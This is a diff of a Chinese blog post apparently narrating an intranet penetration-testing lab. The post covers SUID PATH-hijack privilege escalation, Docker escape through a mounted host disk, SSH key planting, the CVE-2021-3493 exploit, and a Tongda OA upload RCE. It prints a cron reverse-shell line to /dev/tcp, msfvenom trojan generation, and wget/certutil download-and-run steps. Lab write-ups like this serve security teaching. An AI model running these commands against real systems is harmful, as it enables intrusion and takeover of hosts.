 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/173903.html">在Linux中使用环境变量进行提权</a></p>
@@ -426,24 +432,24 @@
 <blockquote>
 <p>PATH变量就是用于保存可以搜索的目录路径，如果待运行的程序不在当前目录，操作系统便可以去依次搜索PATH变量变量中记录的目录，如果在这些目录中找到待运行的程序，操作系统便可以运行。PATH的值是一系列目录，<code>echo $PATH</code> 可以显示环境变量</p>
 </blockquote>
-<p><img src="https://img-blog.csdnimg.cn/1cfe46c1d624451da701158de08f3803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>那么第一步就是先寻找带有SUID的文件,<a target="_blank" rel="noopener" href="http://c.biancheng.net/view/868.html">Linux SetUID（SUID）文件特殊权限用法详解</a></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1cfe46c1d624451da701158de08f3803.png"><br>那么第一步就是先寻找带有SUID的文件,<a target="_blank" rel="noopener" href="http://c.biancheng.net/view/868.html">Linux SetUID（SUID）文件特殊权限用法详解</a></p>
 <blockquote>
 <p>简单来说，对于一个可执行文件，当用户执行此文件时，会以文件所有者的身份去执行此文件，一旦文件执行结束，身份的切换也随之消失</p>
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">-perm -u&#x3D;s : 所有者权限有s权限的目录或文件</span><br><span class="line">-type f  : 文件类型是一般文件</span><br><span class="line">2&gt;&#x2F;dev&#x2F;null : 标准输出错误输入到空(就是错误不显示)</span><br></pre></td></tr></table></figure>
 
 <p>发现一个shell</p>
-<p><img src="https://img-blog.csdnimg.cn/078afd3ceba74f1baeea796defa7566a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//078afd3ceba74f1baeea796defa7566a.png"></p>
 <p>看一下：</p>
-<p><img src="https://img-blog.csdnimg.cn/28ba729bfaab4989a43472b17cc12b74.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//28ba729bfaab4989a43472b17cc12b74.png"></p>
 <p><code>运行ps命令，但是没有使用绝对路径</code></p>
 <p>那么我们尝试更改 <code>$PATH</code> 来执行我们的恶意程序，从而获得目标主机的高权限shell</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH # 将&#x2F;tmp添加到环境变量中，并且先加载执行&#x2F;tmp里的程序</span><br><span class="line">cd &#x2F;home&#x2F;jobs</span><br><span class="line">.&#x2F;shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/1a98a01b8d47490bba6d728b92e5fec1.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1a98a01b8d47490bba6d728b92e5fec1.png"></p>
 <p><code>个人理解</code>：当运行./shell 时，执行系统命令 ps 这个命令本应该在/usr/bin下执行，但是我们添加了一个<code>同名ps且可执行</code>，并且在 $PATH 中 /tmp 处于最开头，所以 <code>先执行了/tmp下的恶意ps</code>，而且因为./shell的<code>s权限</code>，所以在执行恶意 ps 时会以 root 身份执行</p>
 <p>将docker的root权限一句话反弹到web1，www-data的shell可以扔掉了</p>
-<p><img src="https://img-blog.csdnimg.cn/db03344db2ab447a8d120ff234c699e0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//db03344db2ab447a8d120ff234c699e0.png"></p>
 <h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><p>毕竟是一个docker环境，肯定要进行逃逸</p>
 <p>那么基本就三种逃逸方式了：</p>
 <blockquote>
@@ -456,25 +462,25 @@
 </blockquote>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l   &#x2F;&#x2F;查看磁盘文件</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/9da33fe626304021a88df527d876a98c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9da33fe626304021a88df527d876a98c.png"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;cyshack   &#x2F;&#x2F;创建 cyshack文件夹</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;cyshack   &#x2F;&#x2F;将设备挂载到新目录下</span><br><span class="line">ls &#x2F;cyshack  &#x2F;&#x2F;查看是否挂载成功</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/c2ac3ee03bab4880bfb5839f357852a2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>挂载成功，写入计划任务</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//c2ac3ee03bab4880bfb5839f357852a2.png"><br>挂载成功，写入计划任务</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;* * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.52.10&#x2F;7002 0&gt;&amp;1&#39; &gt;&gt; &#x2F;cyshack&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</span><br></pre></td></tr></table></figure>
 <p>但是没有响应</p>
-<p><img src="https://img-blog.csdnimg.cn/de878490496c4eb796b61308cc7ec838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>再次尝试写ssh密钥，发现/cyshack/root下没有.ssh目录</p>
-<p><img src="https://img-blog.csdnimg.cn/8fd3d153c2144cbc9ffd21d1df575126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>再看一下/cyshack/home/ubuntu\</p>
-<p><img src="https://img-blog.csdnimg.cn/ed4c058436664b95b67985d3b55d44a5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>那么就往这里写ssh秘钥，这里还是要在web1上进行写ssh</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//de878490496c4eb796b61308cc7ec838.png"><br>再次尝试写ssh密钥，发现/cyshack/root下没有.ssh目录</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//8fd3d153c2144cbc9ffd21d1df575126.png"><br>再看一下/cyshack/home/ubuntu\</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ed4c058436664b95b67985d3b55d44a5.png"><br>那么就往这里写ssh秘钥，这里还是要在web1上进行写ssh</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh-keygen -f cyshack</span><br><span class="line">chmod 600 cyshack</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2b24a9b37581446d90bccf570c3a3169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2b24a9b37581446d90bccf570c3a3169.png"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp -avx &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;id_rsa.pub &#x2F;cyshack&#x2F;home&#x2F;ubuntu&#x2F;.ssh&#x2F;authorized_keys </span><br><span class="line">&#x2F;&#x2F; -avx 将权限也一起复制</span><br><span class="line"></span><br><span class="line">echo &gt; authorized_keys  &#x2F;&#x2F;将内容清空</span><br><span class="line"></span><br><span class="line">echo &#39;生成的.pub内容&#39; &gt; authorized_keys  &#x2F;&#x2F;将ssh秘钥写入</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/4d416464c2b043a89fe10e1bdd984af4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>用web1尝试ssh连接 web2：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//4d416464c2b043a89fe10e1bdd984af4.png"><br>用web1尝试ssh连接 web2：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i cyshack ubuntu@192.168.52.20</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/644d08c2a340453cafe922512d54a65d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>获取到了web2的ubuntu用户的shell</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//644d08c2a340453cafe922512d54a65d.png"><br>获取到了web2的ubuntu用户的shell</p>
 <p>又发现一个93网段</p>
-<p><img src="https://img-blog.csdnimg.cn/d8f86df95c2348abb10233890c29522a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d8f86df95c2348abb10233890c29522a.png"></p>
 <h1 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h1><p>影响版本：</p>
 <blockquote>
 <p>Ubuntu 20.10<br>Ubuntu 20.04 LTS<br>Ubuntu 18.04 LTS<br>Ubuntu 16.04 LTS<br>Ubuntu 14.04 ESM</p>
@@ -483,126 +489,126 @@
 <p>exp：<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c">CVE-2021-3493/exploit.c at main · briskets</a></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim exploit.c #将下载的exploit.c的内容粘贴到该文件中</span><br><span class="line">gcc exploit.c -o exploit #编译</span><br><span class="line">chmod +x exploit</span><br><span class="line">.&#x2F;exploit</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/fb61764762c64ddbab71ab0878bc7686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//fb61764762c64ddbab71ab0878bc7686.png"></p>
 <h1 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h1><p>将这两台root机器上线到msf</p>
 <p>Web1：</p>
 <p>可以msfvenom生成，web1再执行wget并运行，来反弹shell</p>
 <p>这里直接运用 <code>web_delivery</code> 进行上线，记得切换<code>payload</code> 和 <code>target</code></p>
-<p><img src="https://img-blog.csdnimg.cn/82bc99be64074c389d8ad89c5840e9b8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/1d07be6335f848b7a948bc183d4f3c1b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>下一步就是添加路由上线web2，msf更新后，添加路由更方便了</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//82bc99be64074c389d8ad89c5840e9b8.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1d07be6335f848b7a948bc183d4f3c1b.png"><br>下一步就是添加路由上线web2，msf更新后，添加路由更方便了</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/7ae47f7ea9494f50858d4053fe86705d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7ae47f7ea9494f50858d4053fe86705d.png"></p>
 <p>生成木马，这里运用 <code>bind_tcp</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;8003 -f elf &gt;shell2.elf</span><br></pre></td></tr></table></figure>
 <p>这里怎么让这个木马传到web2呢？因为它不出网，所以web1利用 <code>python起一个httpserver</code> 然后web2利用wget这个木马</p>
 <p>上传木马到web1</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload .&#x2F;shell.elf &#x2F;tmp</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/3d6bc3360d674df88aacb8a792b7210d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d6bc3360d674df88aacb8a792b7210d.png"></p>
 <p>web1起一个服务：注意路径，要起到木马的目录下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/60a72cecad1a4d649c5b31d2f67d27c8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>web2进行下载：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//60a72cecad1a4d649c5b31d2f67d27c8.png"><br>web2进行下载：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.52.10:8000&#x2F;shell.elf</span><br><span class="line">chmod +x shell.elf</span><br><span class="line">.&#x2F;shell.elf</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/1b49ba7a8e9740b8971cb0ad4d4f3f71.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>运行上线</p>
-<p><img src="https://img-blog.csdnimg.cn/7e836052337d412a859e3863fca8a3cf.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>至此有两个机器的shell</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//1b49ba7a8e9740b8971cb0ad4d4f3f71.png"><br>运行上线</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//7e836052337d412a859e3863fca8a3cf.png"><br>至此有两个机器的shell</p>
 <h1 id="二层网络渗透"><a href="#二层网络渗透" class="headerlink" title="二层网络渗透"></a>二层网络渗透</h1><p>添加路由，添加代理(socks_proxy模块记得开启)</p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>内网扫描，先扫52网段，有个问题是，pc1开启防火墙，msf 和 nmap都试了几个都没能扫出来，怎么破？</p>
-<p><img src="https://img-blog.csdnimg.cn/239ff8697d3f41ac9bc5e6fc4e61d045.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
-<p><img src="https://img-blog.csdnimg.cn/d56f010a795d4a8683c7696002dafd2b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>最后 <code>netbios</code> 破了，但是只扫出来一次，os为windows</p>
-<p><img src="https://img-blog.csdnimg.cn/d176266efa75473a966f4826fbea7a08.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>Nmap扫一下pc1，没扫出来，哎，先手动关了防火墙，进行下面的</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//239ff8697d3f41ac9bc5e6fc4e61d045.png"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d56f010a795d4a8683c7696002dafd2b.png"><br>最后 <code>netbios</code> 破了，但是只扫出来一次，os为windows</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//d176266efa75473a966f4826fbea7a08.png"><br>Nmap扫一下pc1，没扫出来，哎，先手动关了防火墙，进行下面的</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -sV -F  192.168.52.30</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/cf98e4a1835f41a0ab3c5f2df20c7386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>发现8080有一个 http 服务</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cf98e4a1835f41a0ab3c5f2df20c7386.png"><br>发现8080有一个 http 服务</p>
 <p>再扫一下版本信息，win7 还存在域环境</p>
-<p><img src="https://img-blog.csdnimg.cn/2750c4ec2f724cdeb24ec6503cdfd6bd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>既然是win7，ms17_010</p>
-<p><img src="https://img-blog.csdnimg.cn/ea822a525dc147438753a1f2653ee50b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/083e4e10ccde4dcb9c560f210f4dfb86.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>失败了</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//2750c4ec2f724cdeb24ec6503cdfd6bd.png"><br>既然是win7，ms17_010</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//ea822a525dc147438753a1f2653ee50b.png"><br><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//083e4e10ccde4dcb9c560f210f4dfb86.png"><br>失败了</p>
 <h2 id="添加代理-访问-http-服务"><a href="#添加代理-访问-http-服务" class="headerlink" title="添加代理 访问 http 服务"></a>添加代理 访问 http 服务</h2><p>看看http服务吧，浏览器先添加代理</p>
-<p><img src="https://img-blog.csdnimg.cn/793acbb4dd84467d98afa369909944e8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>或者proxy代理工具，根据情况自动调整</p>
-<p><img src="https://img-blog.csdnimg.cn/328ef4bf59ac4f649004955c1fd88330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>访问：</p>
-<p><img src="https://img-blog.csdnimg.cn/66c22bc9e15e411a9374d6ca00368474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>信息收集：/inc/expired.php</p>
-<p><img src="https://img-blog.csdnimg.cn/9392aab0eb624a3b823336b4ff1cbed9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//793acbb4dd84467d98afa369909944e8.png" alt="在这里插入图片描述"><br>或者proxy代理工具，根据情况自动调整</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//328ef4bf59ac4f649004955c1fd88330.png"><br>访问：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//66c22bc9e15e411a9374d6ca00368474.png"><br>信息收集：/inc/expired.php</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//9392aab0eb624a3b823336b4ff1cbed9.png"></p>
 <h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/334640244">通达OA前台任意文件上传漏洞+文件包含漏洞导致getshell - 知乎 (zhihu.com)</a></p>
 <p>Burpsuite设置socks代理，不知道为什么socks4不能用：</p>
-<p><img src="https://img-blog.csdnimg.cn/f0d6c518255c45f5a735d7c9efcacfc2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f0d6c518255c45f5a735d7c9efcacfc2.png"></p>
 <p>上传：</p>
-<p><img src="https://img-blog.csdnimg.cn/e012d20b58114b04aa3bf5366a7d38fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//e012d20b58114b04aa3bf5366a7d38fa.png"></p>
 <p>post:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.52.30:8080&#x2F;&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br><span class="line"></span><br><span class="line">json&#x3D;&#123;&quot;url&quot;:&quot;&#x2F;general&#x2F;..&#x2F;..&#x2F;attach&#x2F;im&#x2F;2108&#x2F;1888762391.jpg&quot;&#125;&amp;cmd&#x3D;net user</span><br></pre></td></tr></table></figure>
 <h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>Msf利用web_delivery</p>
 <p>生成powershell</p>
-<p><img src="https://img-blog.csdnimg.cn/3d749b30b2b944fea074420f630ccd2f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//3d749b30b2b944fea074420f630ccd2f.png" alt="在这里插入图片描述"></p>
 <p>这里没有上线成功</p>
 <p>想着让win7主动下载木马</p>
 <p>这里我偷个懒直接攻击机起一个服务，在真实渗透环境中，应该上传到跳板机上</p>
-<p><img src="https://img-blog.csdnimg.cn/f482bb44341a414ea24a0e65607a40e4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//f482bb44341a414ea24a0e65607a40e4.png"></p>
 <p>让win7主动下载</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http:&#x2F;&#x2F;192.168.42.224&#x2F;shell3.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/dd986b533f41492b95f58002ee730b8b.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>开启监听：</p>
-<p><img src="https://img-blog.csdnimg.cn/a192967f4cb844c38d30efdfc0ba09e0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>没反应，传一个 bind_tcp的马</p>
-<p><img src="https://img-blog.csdnimg.cn/cc8069b746e042be99dd8051c96dd146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70#pic_center"><br>监听换个payload，再次执行上面</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//dd986b533f41492b95f58002ee730b8b.png"><br>开启监听：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//a192967f4cb844c38d30efdfc0ba09e0.png"><br>没反应，传一个 bind_tcp的马</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/ATT&CK//cc8069b746e042be99dd8051c96dd146.png"><br>监听换个payload，再次执行上面</p>
 <p>上线成功：</p>
